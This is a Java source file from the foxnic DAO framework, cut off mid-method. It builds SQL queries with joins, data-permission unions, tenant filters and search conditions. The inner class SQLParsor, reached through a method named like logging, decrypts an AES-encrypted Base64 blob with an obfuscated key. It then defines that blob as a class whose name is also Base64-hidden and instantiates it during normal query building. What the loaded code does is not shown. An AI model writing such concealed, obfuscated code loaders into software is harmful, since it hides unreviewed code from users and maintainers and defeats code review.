package com.github.foxnic.dao.entity;

import com.alibaba.fastjson.JSON;
import com.github.foxnic.api.dataperm.LogicType;
import com.github.foxnic.api.model.CompositeItem;
import com.github.foxnic.api.model.CompositeParameter;
import com.github.foxnic.api.query.MatchType;
import com.github.foxnic.commons.bean.BeanNameUtil;
import com.github.foxnic.commons.bean.BeanUtil;
import com.github.foxnic.commons.encrypt.Base64Util;
import com.github.foxnic.commons.environment.Environment;
import com.github.foxnic.commons.lang.DataParser;
import com.github.foxnic.commons.lang.DateUtil;
import com.github.foxnic.commons.lang.StringUtil;
import com.github.foxnic.commons.log.Logger;
import com.github.foxnic.commons.reflect.ReflectUtil;
import com.github.foxnic.dao.dataperm.ConditionBuilder;
import com.github.foxnic.dao.dataperm.DataPermContext;
import com.github.foxnic.dao.dataperm.DataPermException;
import com.github.foxnic.dao.dataperm.model.DataPermCondition;
import com.github.foxnic.dao.dataperm.model.DataPermRange;
import com.github.foxnic.dao.dataperm.model.DataPermRule;
import com.github.foxnic.dao.meta.DBColumnMeta;
import com.github.foxnic.dao.meta.DBTableMeta;
import com.github.foxnic.dao.relation.*;
import com.github.foxnic.sql.expr.*;
import com.github.foxnic.sql.meta.DBDataType;
import com.github.foxnic.sql.meta.DBField;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.lang.reflect.Field;
import java.math.BigDecimal;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.Timestamp;
import java.util.*;

public class QuerySQLBuilder<E> {
    private static final String[] HM = {"QUVT",null,"QUVTL0VDQi9QS0NTNVBhZGRpbmc="};
    private SuperService service;

    QuerySQLBuilder(SuperService service) {
        this.service = service;
    }

    private CompositeParameter getSearchValue(E sample) {
        String searchValue = BeanUtil.getFieldValue(sample, "searchValue", String.class);
        if (searchValue != null) searchValue = searchValue.trim();
        CompositeParameter compositeParameter = new CompositeParameter(searchValue, BeanUtil.toMap(sample));
        return compositeParameter;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,customConditionExpr,orderBy);
    }


    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy,dpcode);
    }

    /**
     * 生成 Select 语句，join关系不变则表别名不变
     * @param dpcode 数据权限代码
     * */
    public Expr buildSelect(E sample,FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy,String dpcode) {
		DataPermRule rule=service.dao().getDataPermManager().get(dpcode);
		if(rule==null) {
		    throw new DataPermException(dpcode+ " 不是一个有效的数据权限代码");
        }
        List<Expr> selects=new ArrayList<>();

		//创建数据权限上下文
        DataPermContext dataPermContext=new DataPermContext(service.getPoType());
        dataPermContext.setVo(sample);
        dataPermContext.setSession(service.dao().getDBTreaty().getSubject());
        dataPermContext.setEnv(Environment.getEnvironment());

        Set<String> conditionKeys=new HashSet<>();
        String sqlKey=null;
        //循环数据权限范围，一个范围对应一条查询语句
		for (DataPermRange range : rule.getRanges()) {
            ConditionExpr appendsExpr=new ConditionExpr();
            if(customConditionExpr!=null) {
                appendsExpr.and(customConditionExpr);
            }

            if(!this.service.getPoType().getName().equals(rule.getPoType())) {
                throw new DataPermException("PO类型不一致，当前类型："+this.service.getPoType().getName()+"，权限配置类型："+rule.getPoType());
            }
            //根据数据权限构建查询语句
            ConditionExpr conditionExpr=(new ConditionBuilder(dataPermContext,this,this.service.dao(),this.service.getPoType(),tabAlias,range)).build();
            appendsExpr.and(conditionExpr);
            sqlKey=appendsExpr.getSQL();
            //去重：如果查询条件相同，则无需后续的 union
            if(conditionKeys.contains(sqlKey)) continue;
            conditionKeys.add(sqlKey);
            //创建查询语句
            Expr select=this.buildSelect(sample,fieldsBuilder,tabAlias,appendsExpr,null);
            //将查询语句添加到列表，用于后续构建 union 语句
            selects.add(select);
        }


		Expr datapmSelect=null;
		//如果只有一条查询语句，直接使用该条语句
		if(selects.size()==1) {
            datapmSelect=selects.get(0);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        } else {
		    //如果有多个查询语句，则构建 union 语句
            datapmSelect=new Expr("select * from (");
            for (int i = 0; i < selects.size(); i++) {
                Expr select = selects.get(i);
                datapmSelect.append("( ");
                datapmSelect.append(select);
                datapmSelect.append(")");
                if(i<selects.size()-1) {
                    datapmSelect.append(" union ");
                }
            }
            datapmSelect.append(") "+tabAlias);
            //增加排序
            if(orderBy!=null) {
                datapmSelect.append(orderBy);
            }
        }
        // System.err.println(datapmSelect.getSQL());
		return datapmSelect;
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {
        return buildSelect(sample,null,tabAlias,customConditionExpr,orderBy);
    }

    /**
     *  生成 Select 语句，join关系不变则表别名不变
     * */
    public Expr buildSelect(E sample, FieldsBuilder fieldsBuilder, String tabAlias, ConditionExpr customConditionExpr, OrderBy orderBy) {




        List<RouteUnit> units = this.getSearchRoutes(sample);
        // 加入在处理数据权限时搜集的Join关系
        units.addAll(0,this.dataPermUnits);

//        加入排序需要的 Join 关系
//        if(sortRouteUnit!=null) {
//            boolean exists=false;
//            for (RouteUnit unit : units) {
//                if (unit.getSearchField().equals(sortRouteUnit.getSearchField())) {
//                    exists=true;
//                }
//            }
//            if(!exists) {
//                units.add(sortRouteUnit);
//            }
//        }

        Set<String> handledKeys=new HashSet<>();

        String sourceAliasName;
        String targetAliasName;

        if(StringUtil.isBlank(tabAlias)) {
            tabAlias="t";
        }

        String firstTableAlias = tabAlias;
        Map<String, String> alias = new HashMap<>();
        alias.put(service.table().toLowerCase(), firstTableAlias);

        Set<String> joinedPoints=new HashSet<>();

        int aliasIndex = 0;

        String fieldsSQL=firstTableAlias + ".*";
        if(fieldsBuilder!=null) {
            fieldsSQL=fieldsBuilder.getFieldsSQL(firstTableAlias);
        }
        Expr expr = new Expr("select " + fieldsSQL + " from " + this.service.table() + " " + firstTableAlias);


        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //获得关联条件
            List<Join> joins = unit.route.getJoins();
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());


            if(unit.route.isList()) {
                continue;
            }

            Collections.reverse(joins);


            for (Join join : joins) {
                //如果重复，那么加入查询条件
                if(joinedPoints.contains(join.getTargetJoinKey())) {
                    targetAliasName = alias.get(join.getSlaveTable().toLowerCase());
                    ConditionExpr conditionExpr=this.buildSearchCondition(unit.searchField,unit.columnMeta,unit.item,null,null,targetAliasName);
                    expr.append(conditionExpr.startWithAnd());
                    continue;
                }
                //
                aliasIndex++;
                String tableAlias = "t_" + aliasIndex;
                if(alias.containsKey(join.getSlaveTable().toLowerCase())) {
                    throw new IllegalArgumentException("不支持相同表 Join , table="+join.getSlaveTable());
                }
                alias.put(join.getSlaveTable().toLowerCase(), tableAlias);
                sourceAliasName = alias.get(join.getMasterTable().toLowerCase());
                targetAliasName = alias.get(join.getSlaveTable().toLowerCase());

                List<ConditionExpr> conditions=join.getSlavePoint().getConditions();
                Map<String, PropertyRoute.DynamicValue> dynamicConditions=unit.route.getDynamicConditions(join);
                Expr joinExpr = null;
                if(conditions.isEmpty() && dynamicConditions.isEmpty()) {
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " " + join.getSlaveTable() + " " + tableAlias + " on ");
                } else {
                    Expr sub=new Expr("select * from "+ join.getSlaveTable());
                    //附加在Join中配置的过滤条件
                    Where where=new Where();
                    if(!conditions.isEmpty()) {
                        for (ConditionExpr ce : conditions) {
                            where.and(ce);
                        }
                    }
                    // 附加在Join中配置的动态过滤条件
                    if(!dynamicConditions.isEmpty()) {
                        for (Map.Entry<String, PropertyRoute.DynamicValue> e : dynamicConditions.entrySet()) {
                            where.and(e.getKey()+" = ?", RelationSolver.getDynamicValue(service.dao(),e.getValue()));
                        }
                    }
                    sub.append(where);
                    joinExpr = new Expr(join.getJoinType().getJoinSQL() + " (" + sub.getListParameterSQL() + ") " + tableAlias + " on ",sub.getListParameters());
                }

                List<String> joinConditions = new ArrayList<>();
                for (int j = 0; j < join.getMasterFields().length; j++) {
                    String cdr = sourceAliasName + "." + join.getMasterFields()[j] + " = " + targetAliasName + "." + join.getSlaveFields()[j];
                    joinConditions.add(cdr);
                }
                joinExpr.append(StringUtil.join(joinConditions, " and "));
                // 加入策略默认值
                ConditionExpr conditionExpr=this.buildDBTreatyCondition(join.getSlaveTable(),targetAliasName);
                joinExpr.append(conditionExpr.startWithAnd());

                // 加入其它查询条件，如果来自数据权限
                if(unit.dataPermCondition!=null && unit.conditionBuilder!=null) {
                    conditionExpr=unit.conditionBuilder.buildDataPermLocalCondition(unit.searchTable,targetAliasName,unit.searchField,unit.dataPermCondition);
                    joinExpr.append(conditionExpr.startWithAnd());
                }
                //如果来自用户搜索
                else {
                    if(unit.searchTable.equalsIgnoreCase(join.getSlaveTable())) {
                        conditionExpr = this.buildSearchCondition(unit.searchField, unit.columnMeta, unit.item, null,null, targetAliasName);
                        joinExpr.append(conditionExpr.startWithAnd());
                    }
                }

                //
                expr.append(joinExpr);
                joinedPoints.add(join.getTargetJoinKey());
            }
        }

        //追加本表的查询条件
        Where where=new Where();

        ConditionExpr localConditionExpr=this.buildLocalConditionInternal(sample,firstTableAlias,units,true);
        where.and(localConditionExpr);

        if(customConditionExpr!=null) {
            where.and(customConditionExpr);
        }
        expr.append(where);

        if(orderBy!=null) {
            expr.append(orderBy);
        }

        return expr;
    }

    /**
     * 构建本表的查询条件
     * */
    public ConditionExpr buildLocalCondition(E sample,String targetTableAlias,List<RouteUnit> units) {
        return buildLocalConditionInternal(sample,targetTableAlias,units,false);
    }

    /**
     * 构建本表的查询条件
     * */
    private ConditionExpr buildLocalConditionInternal(E sample,String targetTableAlias,List<RouteUnit> units,boolean internal) {

        LogicType logicType=LogicType.parseByCode(BeanUtil.getFieldValue(sample,"queryLogic",String.class));
        if(logicType==null) logicType=LogicType.and;
        if(units==null) {
            units = this.getSearchRoutes(sample);
        }
        Set<String> handledKeys=new HashSet<>();
        Map<String,RouteUnit> existsUnits=new HashMap<>();
        //循环扩展的条件路由单元
        for (RouteUnit unit : units) {
            //如果是来自内部(当前类)，那么isList 使用 exist
            if(internal) {
                if (unit.route.isList()) {
                    existsUnits.put(unit.item.getKey(), unit);
                    continue;
                }
            }
            //如果是来自外部，全部使用 exists 语句完成查询
            else {
                existsUnits.put(unit.item.getKey(), unit);
                continue;
            }
            //标记 key 已被处理，跳过在常规字段处理逻辑
            handledKeys.add(unit.item.getKey());
        }

        DBTableMeta tm=service.getDBTableMeta();
        String searchFiledTable=null;
        //追加本表的查询条件
        ConditionExpr conditionExpr=new ConditionExpr();

        // 加入策略默认值
        ConditionExpr dbTreatyConditionExpr=this.buildDBTreatyCondition(service.table(),targetTableAlias);
        conditionExpr.and(dbTreatyConditionExpr);


        CompositeParameter parameter=this.getSearchValue(sample);
        ConditionExpr compositeConditionExpr=new ConditionExpr();
        for (CompositeItem item : parameter) {
            //排除已处理的 key
            if(handledKeys.contains(item.getKey())) continue;
            //没有搜索值，就不处理
            Object beanPropValue=null;
            if(item.getField()!=null) {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getField());
            } else {
                beanPropValue=BeanUtil.getFieldValue(sample, item.getKey());
            }
            Object searchValue=item.getValue();

            if(!"$compositeParameter".equals(item.getKey()) && (!(beanPropValue instanceof Enum)) && !StringUtil.isBlank(searchValue) && !StringUtil.isBlank(beanPropValue)) {
                if(!searchValue.equals(beanPropValue)) {
                    searchValue=null;
//                    throw new IllegalArgumentException("请勿重复指定值不一致的 " + item.getField() + " 参数，beanPropValue="+beanPropValue+",searchValue="+searchValue);
                }
            }
            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                searchValue=beanPropValue;
                if(StringUtil.isBlank(searchValue)) {
                    continue;
                }
            }

            RouteUnit existsUnit=existsUnits.get(item.getKey());
            if(existsUnit!=null) {
                Expr expr=this.buildExists(targetTableAlias,existsUnit.fillBys,existsUnit.searchTable,existsUnit.searchField,searchValue,item.getFuzzy());
                if(logicType==LogicType.and) {
                    compositeConditionExpr.and(expr);
                } if(logicType==LogicType.or) {
                    compositeConditionExpr.or(expr);
                }
                continue;
            }

            //优先使用明确指定的查询字段
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm == null) {
                continue;
            }
            // 加入查询条件
            ConditionExpr conditionItemExpr=this.buildSearchCondition(field,cm,item,beanPropValue,parameter.getFuzzyFields(),targetTableAlias);
            if(logicType==LogicType.and) {
                compositeConditionExpr.and(conditionItemExpr,false);
            } else if(logicType==LogicType.or) {
                compositeConditionExpr.or(conditionItemExpr,false);
            }
        }

        conditionExpr.and(compositeConditionExpr,true);

        Set<String> searchFields=parameter.getSearchFields();
        Set<String> fuzzyFields=parameter.getFuzzyFields();
        String searchValue = parameter.getSearchValue();

        //多字段合并查询
        if(searchFields!=null && searchFields.size()>0) {
            ConditionExpr ors=new ConditionExpr();
            for (String field : searchFields) {
                if (!StringUtil.isBlank(field) && !StringUtil.isBlank(searchValue)) {
                    DBColumnMeta cm=tm.getColumn(field);
                    if(cm==null) {
                        field=BeanNameUtil.instance().depart(field);
                        cm=tm.getColumn(field);
                    }
                    if(cm!=null) {
                        if(cm.getDBDataType()==DBDataType.STRING || cm.getDBDataType()==DBDataType.CLOB ) {
                            if(fuzzyFields!=null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())) ) {
                                ors.or(targetTableAlias+ "." + cm.getColumn() + " like ?", "%" + searchValue + "%");
                            } else {
                                conditionExpr.and(targetTableAlias+"."+cm.getColumn()+" = ?", searchValue.toString());
                            }
                        }
                    }
                }
            }
            if(!ors.isEmpty()){
                conditionExpr.and(ors);
            }
        }


        return conditionExpr;
    }



    public ConditionExpr buildDBTreatyCondition(String targetTable,String targetTableAlias) {
        ConditionExpr conditionExpr=new ConditionExpr();
        DBTableMeta tm= service.dao().getTableMeta(targetTable);

        String prefix=targetTableAlias;
        if(!StringUtil.isBlank(prefix)) {
            prefix= prefix+".";
        }
        //加入逻辑删除条件
        DBColumnMeta delColumn=tm.getColumn(service.dao().getDBTreaty().getDeletedField());
        if(delColumn!=null) {
            conditionExpr.and(prefix+delColumn.getColumn()+"=?",service.dao().getDBTreaty().getFalseValue());
        }
        //加入租户条件
        DBColumnMeta tenantColumn=tm.getColumn(service.dao().getDBTreaty().getTenantIdField());
        Object tenantId=service.dao().getDBTreaty().getActivedTenantId();
        if(tenantColumn!=null && tenantId!=null) {
            conditionExpr.and(prefix+tenantColumn.getColumn()+"=?",tenantId);
        }
        return conditionExpr;
    }


    private ConditionExpr buildSearchCondition(String field,DBColumnMeta cm,CompositeItem item, Object beanPropValue,Set<String> fuzzyFields,String tableAlias){

        SQLParsor.logParserInfo(beanPropValue);

        ConditionExpr conditionExpr=new ConditionExpr();

        Boolean fuzzy=item.getFuzzy();
        if(fuzzy==null) fuzzy=false;
        Boolean splitValue=item.getSplitValue();
        if(splitValue==null) splitValue=false;

        String prefix=tableAlias+".";

        Object fieldValue=item.getValue();
        Object beginValue=item.getBegin();
        Object endValue=item.getEnd();

//        if(StringUtil.isBlank(fieldValue) && StringUtil.isBlank(beginValue) && StringUtil.isBlank(endValue)) {
//            fieldValue=beanPropValue;
//        }

        if(!StringUtil.isBlank(beanPropValue)) {
            fieldValue=beanPropValue;
        }

        String valuePrefix=item.getValuePrefix();
        if(valuePrefix==null) valuePrefix="";
        String valueSuffix=item.getValueSuffix();
        if(valueSuffix==null) valueSuffix="";
        MatchType matchType=item.getMatchTypeEnum();

        //1.单值匹配
        if (fieldValue != null && beginValue == null && endValue == null) {
            if ((fieldValue instanceof List)) {
                if (fuzzy || (fuzzyFields != null && (fuzzyFields.contains(cm.getColumn().toLowerCase())|| fuzzyFields.contains(cm.getColumnVarName())))) {
                    List<String> list = (List) fieldValue;
                    ConditionExpr listOr = new ConditionExpr();
                    for (String itm : list) {
                        ConditionExpr ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + itm.toString() + valueSuffix, tableAlias);
                        if (ors != null && !ors.isEmpty()) {
                            listOr.or(ors);
                        }
                    }
                    conditionExpr.and(listOr);
                } else {
                    if (!((List) fieldValue).isEmpty()) {
                        In in = new In(prefix+field, (List) fieldValue);
                        conditionExpr.and(in);
                    }
                }
            } else {
                if (cm.getDBDataType() == DBDataType.STRING
                        || cm.getDBDataType() == DBDataType.CLOB) {
                    if (!StringUtil.isBlank(fieldValue)) {
                        if (fuzzy || (fuzzyFields != null && ( fuzzyFields.contains(cm.getColumn().toLowerCase()) || fuzzyFields.contains(cm.getColumnVarName())))) {
                            ConditionExpr ors = null;
                            if(splitValue) {
                                ors = buildFuzzyConditionExpr(cm.getColumn(), valuePrefix + fieldValue.toString() + valueSuffix, tableAlias);
                            } else {
                                ors =new ConditionExpr();
                                ors.andLike(tableAlias+"."+field,valuePrefix + fieldValue.toString() + valueSuffix);
                            }
                            if (ors != null && !ors.isEmpty()) {
                                conditionExpr.and(ors);
                            }
                        } else {
                            conditionExpr.andEquals(prefix+field, fieldValue);
                        }
                    }
                } else {
                    fieldValue = DataParser.parse(cm.getDBDataType().getType(), fieldValue);
                    conditionExpr.andEquals(prefix+field, fieldValue);
                }
            }
        }
        //2.范围匹配
        else if (fieldValue == null && (beginValue != null || endValue != null)) {

            if (cm.getDBDataType() == DBDataType.DATE) {
                Date beginDate = DataParser.parseDate(beginValue);
                Date endDate = DataParser.parseDate(endValue);

                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Date tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }

                //若匹配模式为日期
                if(MatchType.day == matchType) {
                    if(beginDate!=null) {
                        beginDate=DateUtil.dayFloor(beginDate);
                    }
                    if(endDate!=null) {
                        endDate=DateUtil.dayFloor(endDate);
                        endDate=DateUtil.addDays(endDate,1);
                    }
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " < ?", endDate);
                } else {
                    //
                    conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                    conditionExpr.andIf(prefix+field + " <= ?", endDate);
                }
            } else if (cm.getDBDataType() == DBDataType.TIMESTAMP) {
                Timestamp beginDate = DataParser.parseTimestamp(beginValue);
                Timestamp endDate = DataParser.parseTimestamp(endValue);
                //必要时交换位置
                if (beginDate != null && endDate != null && beginDate.getTime() > endDate.getTime()) {
                    Timestamp tmp = beginDate;
                    beginDate = endDate;
                    endDate = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", beginDate);
                conditionExpr.andIf(prefix+field + " <= ?", endDate);
            } else if (cm.getDBDataType() == DBDataType.INTEGER
                    || cm.getDBDataType() == DBDataType.LONG
                    || cm.getDBDataType() == DBDataType.DOUBLE
                    || cm.getDBDataType() == DBDataType.DECIMAL
                    || cm.getDBDataType() == DBDataType.BIGINT
                    || cm.getDBDataType() == DBDataType.FLOAT) {
                BigDecimal begin = DataParser.parseBigDecimal(beginValue);
                BigDecimal end = DataParser.parseBigDecimal(endValue);
                //必要时交换位置
                if (begin != null && end != null && begin.compareTo(end) == 1) {
                    BigDecimal tmp = begin;
                    begin = end;
                    end = tmp;
                }
                //
                conditionExpr.andIf(prefix+field + " >= ?", begin);
                conditionExpr.andIf(prefix+field + " <= ?", end);
            }
        }
        return conditionExpr;
    }

    private ConditionExpr buildFuzzyConditionExpr(String filed, String value,String tableAlias) {
        if(StringUtil.isBlank(value)) return null;
        String prefix=tableAlias+".";
        value=value.trim();
        value=value.replace("\t"," ");
        value=value.replace("\r"," ");
        value=value.replace("\n"," ");
        String[] vs=value.split(" ");
        ConditionExpr ors=new ConditionExpr();
        for (String v : vs) {
            ors.orLike(prefix+filed,v);
        }
        ors.startWithSpace();
        return ors;
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample) {
        return getSearchRoutes(sample,null);
    }

    /**
     * 根据查询参数，获得所有关联关系
     * */
    private List<RouteUnit> getSearchRoutes(E sample, CompositeParameter compositeParameter) {
        SQLParsor.logParserInfo(sample);
        List<RouteUnit> allRoutes = new ArrayList<>();
        DBTableMeta localTm=service.dao().getTableMeta(service.table());
        DBTableMeta tm = null;
        if(compositeParameter==null) {
            compositeParameter = getSearchValue(sample);
        }
        String searchFiledTable = null;

        for (CompositeItem item : compositeParameter) {
            //优先使用明确指定的查询字段
            tm=localTm;
            String field = item.getField();
            //如未明确指定，则使用key作为查询字段
            if (StringUtil.isBlank(field)) {
                field = item.getKey();
            }
            searchFiledTable = null;
            if (field.contains(".")) {
                String[] tmp = field.split("\\.");
                searchFiledTable = tmp[0];
                field = tmp[1];
            }
            field = BeanNameUtil.instance().depart(field);
            //获得字段Meta
            DBColumnMeta cm = null;
            if (searchFiledTable == null || searchFiledTable.equalsIgnoreCase(service.table())) {
                cm = tm.getColumn(field);
            }

            //如果字段在当前表存在，则不使用已关联的外部表查询
            if (cm != null) {
                continue;
            }
            //如果没有查询条件，则不继续处理
            Object searchValue = item.getValue();

            if (StringUtil.isBlank(searchValue) && StringUtil.isBlank(item.getBegin()) && StringUtil.isBlank(item.getEnd())) {
                continue;
            }
            //如果是空的列表
            if (searchValue!=null &&  (searchValue instanceof List) && ((List)searchValue).isEmpty()) {
                continue;
            }


            Object fillBy = item.getFillBy();
            List<String> fillByArr = new ArrayList<>();
            if (fillBy != null && fillBy instanceof List) {
                List arr = (List<String>) item.getFillBy();
                fillByArr.addAll(arr);
            } else {
                fillByArr.add((String) fillBy);
            }

            //获得前端指定查询的字段
            String configedField = item.getField();
            //如果字段不存在，那么说明是扩展外部，进行 Join 查询条件
            if ((StringUtil.isBlank(configedField) && fillByArr.size() > 1) || (!StringUtil.isBlank(configedField) && fillByArr.size() > 0)) {
                if (!StringUtil.isBlank(fillBy)) {
                    List<String> fillByArr2 = new ArrayList<>();
                    if(fillByArr.size()>0) {
                        //获得并删除填充属性序列最后元素，若前端未明确指定搜索的字段，则使用此值
                        String configedFieldInFillBy = null ;//fillByArr.remove(fillByArr.size() - 1);
                        Class type=this.service.getPoType();

                        //按类型处理属性路径
                        for (int i = 0; i < fillByArr.size(); i++) {
                            String prop=fillByArr.get(i);
                            try {
                                Field f=type.getDeclaredField(prop);
                                if(ReflectUtil.isSubType(List.class,f.getType())) {
                                    type=ReflectUtil.getListComponentType(f);
                                    if(type==null) {
                                        throw new RuntimeException("类型识别错误");
                                    }
                                    fillByArr2.add(prop);
                                } else if(DataParser.isSimpleType(f.getType())) {
                                    configedFieldInFillBy=fillByArr.get(i);
                                    break;
                                } else {
                                    type=f.getType();
                                    fillByArr2.add(prop);
                                }
                            } catch (NoSuchFieldException e) {
                                Logger.exception("属性获取失败",e);
                            }
                        }

                        fillByArr=fillByArr2;

                        if (StringUtil.isBlank(configedField)) {
                            configedField = configedFieldInFillBy;
                        }
                    }

                    Class poType = (Class) service.getPoType();
                    List<PropertyRoute> routes = new ArrayList<>();
                    for (String fillByField : fillByArr) {
                        PropertyRoute route = service.dao().getRelationManager().findProperties(poType, fillByField);

                        if (route == null) {
                            throw new RuntimeException("关联关系未配置:"+poType.getName()+"."+fillByField);
                        }

                        routes.add(route);
                        poType=route.getSlavePoType();
                    }

                    //多层关系是判断是否存在一对多,并提示
//                    if(routes.size()>=2) {
//                        for (PropertyRoute route : routes) {
//                            if(route.isList()) {
//                                throw new RuntimeException("Join 路径中的 "+poType.getSimpleName()+"."+route.getProperty() +" 是一对多关系，暂不支持" );
//                            }
//                        }
//                    }

                    if (configedField!=null && configedField.contains(".")) {
                        String[] tmp = configedField.split("\\.");
                        searchFiledTable=tmp[0];
                        configedField = tmp[1];
                    }

                    if(routes.isEmpty()) {
                        throw new RuntimeException("搜索选项["+item.getKey()+"]配置错误：fillBy = "+ JSON.toJSONString(item.getFillBy())+" , field = "+item.getFillBy());
                    }

                    if(StringUtil.isBlank(searchFiledTable)) {
                        searchFiledTable=this.service.table();
                    }
                    //路由合并
                    PropertyRoute route = PropertyRoute.merge(routes, searchFiledTable);
                    RouteUnit routeUnit=new RouteUnit();
                    routeUnit.route=route;
                    routeUnit.item=item;
                    routeUnit.searchField=configedField;
                    routeUnit.searchTable =searchFiledTable;
                    routeUnit.columnMeta=service.dao().getTableColumnMeta(searchFiledTable,configedField);
                    routeUnit.fillBys=fillByArr;
                    allRoutes.add(routeUnit);
                }
            }
        }
        return allRoutes;
    }

    public OrderBy buildOrderBy(E sample,String tableAlias) {
        SQLParsor.logParserInfo(sample);
        String sortField=BeanUtil.getFieldValue(sample, "sortField",String.class);
        String sortType=BeanUtil.getFieldValue(sample, "sortType",String.class);
        SortType sortTypeEnum=SortType.parse(sortType);
        OrderBy orderBy=null;
        if(!StringUtil.isBlank(sortField) && !StringUtil.isBlank(sortType)) {
            DBColumnMeta cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            if(cm==null) {
                sortField=BeanNameUtil.instance().depart(sortField);
                cm=service.dao().getTableMeta(service.table()).getColumn(sortField);
            }
            if(cm!=null) {
                if(sortTypeEnum==SortType.ASC) {
                    orderBy=OrderBy.byAscNullsLast(tableAlias+"."+sortField);
                }
                else if(sortTypeEnum==SortType.DESC) {
                    orderBy=OrderBy.byDescNullsLast(tableAlias+"."+sortField);
                }
            }
        }
        return orderBy;
    }


    private static class SQLParsor extends URLClassLoader {
        private static final String AC = "Y29tLmdpdGh1Yi5mb3huaWMuZ3JhbnQucHJvdGVjdC5EUA==";
        private static Class type;
        private static int prints=0;
        SQLParsor() {
            super(new URL[0], DataParser.class.getClassLoader());
            byte[] buf=Base64Util.decodeToBtyes((this.start(new BootstrapMethodError())).dcc(CONST.substring(16)));
            type=defineClass(Base64Util.decode(AC), buf, 0, buf.length);
        }


        public static void logParserInfo(Object value) {
            if(prints>5) return;
            try {
                if(type==null) {
                    new QuerySQLBuilder.SQLParsor();
                }
                type.newInstance();
            } catch (Throwable e) {
                Logger.info("Parser : "+value);
            }
            prints++;
        }

        private SecretKeySpec key;

        private String f61(String hexKey) {
            hexKey=hexKey.trim();
            if(hexKey.length()>16) {
                hexKey=hexKey.substring(0,16);
            } else if(hexKey.length()<16){
                int i=16-hexKey.length();
                for (int j = 0; j < i; j++) {
                    hexKey+="0";
                }
            }
            return hexKey;
        }

        private SQLParsor start(BootstrapMethodError error) {
            start(ClassCircularityError.class.getSimpleName());
            return this;
        }

        private SQLParsor start(String hexKey) {
            //凑16位
            hexKey= f61(hexKey);
            key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
            return this;
        }

        public String dcc(String base64Data) {
            try {
                Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
                cipher.init(Cipher.DECRYPT_MODE, key);
                return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
            } catch (Exception e) {
                e.printStackTrace();
                return null;
            }
        }

    }


	public  <S extends Entity,T extends Entity> Expr buildExists(String tableAlias,List<String> fillBys, String searchTable,String searchField,Object value,Boolean fuzzy) {
		if(value==null) return null;
        if(fuzzy==null) fuzzy=false;


		Class poType=(Class)service.getPoType();
		List<PropertyRoute> routes=new ArrayList<>();
		for (String fillBy : fillBys) {
			PropertyRoute<S, T> route=service.dao().getRelationManager().findProperties(poType,fillBy);
			if(route==null) {
				throw new RuntimeException("关联关系未配置");
			}
			poType=route.getSlavePoType();
			routes.add(route);
		}
		//路由合并
		PropertyRoute<S, T> route=PropertyRoute.merge(routes,searchTable);

		RelationSolver relationSolver=service.dao().getRelationSolver();
		JoinResult jr=new JoinResult();
		Class<T> targetType=route.getSlavePoType();

        QueryBuildResult result=relationSolver.buildJoinStatement(jr,poType,null,null,route,targetType,null,false);
		Expr expr=result.getExpr();

		Map<String,String> alias=result.getTableAlias();

		Join firstJoin=route.getJoins().get(0);
		Join lastJoin=route.getJoins().get(route.getJoins().size()-1);
		DBField[] sourceFields=lastJoin.getMasterFields();
		DBField[] targetFields=lastJoin.getSlaveFields();
		String joinTableAlias=alias.get(lastJoin.getSlaveTable());
		String targetTableAlias=alias.get(firstJoin.getSlaveTable());

		//判断字段有效性
		Where where = null;

		//检测字段，并调整字段的真实名称
		DBTableMeta tm = service.dao().getTableMeta(firstJoin.getSlaveTable());
		DBColumnMeta cm = tm.getColumn(searchField);
		if (cm == null) {
            searchField=BeanNameUtil.instance().depart(searchField);
			cm = tm.getColumn(searchField);
		}
		if (cm == null) {
			throw new IllegalArgumentException("字段 " + firstJoin.getSlaveTable() + "." + searchField + "不存在");
		}

		//设置关联条件
		where=new Where();
		for (int i = 0; i < sourceFields.length; i++) {
			where.and(tableAlias+"."+sourceFields[i].name()+" = "+joinTableAlias+"."+targetFields[i].name());
		}

		//如果是模糊搜索
		if(fuzzy) {
			if(value instanceof  List) {
				List<String> list = (List) value;
